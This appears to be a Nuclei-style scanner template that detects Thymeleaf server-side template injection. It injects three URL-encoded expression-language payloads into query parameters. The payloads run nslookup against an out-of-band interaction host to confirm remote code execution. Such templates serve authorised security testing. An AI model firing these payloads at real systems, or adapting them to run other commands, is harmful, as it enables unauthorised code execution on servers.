http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: single
    part: query
    type: replace
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol,'dns')
    - contains(interactsh_request,'srv')
    name: request-matcher
    type: dsl
  payloads:
    injection:
    - '%24%7B%23rt%20%3D%20%40java.lang.Runtime%40getRuntime%28%29%2C%23rt.exec%28%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27%29%7D'
    - '%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27%29%7D'
    - '%24%7Bnew%20java.lang.ProcessBuilder%28%27nslookup%27%2C%27-type%3DSRV%27%2C%27{{interactsh-url}}%27%29.start%28%29%7D'
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
id: thymeleaf-oob
info:
  author: ritikchaddha
  description: 'Thymeleaf template injection occurs when user input is embedded in
    a template without proper sanitization. This can lead to remote code execution
    through Thymeleaf''s expression language features.

    '
  metadata:
    max-request: 1
  name: Thymeleaf - Out of Band Template Injection
  reference:
  - https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
  severity: high
  tags: thymeleaf,oob,ssti,oast,dast,vuln
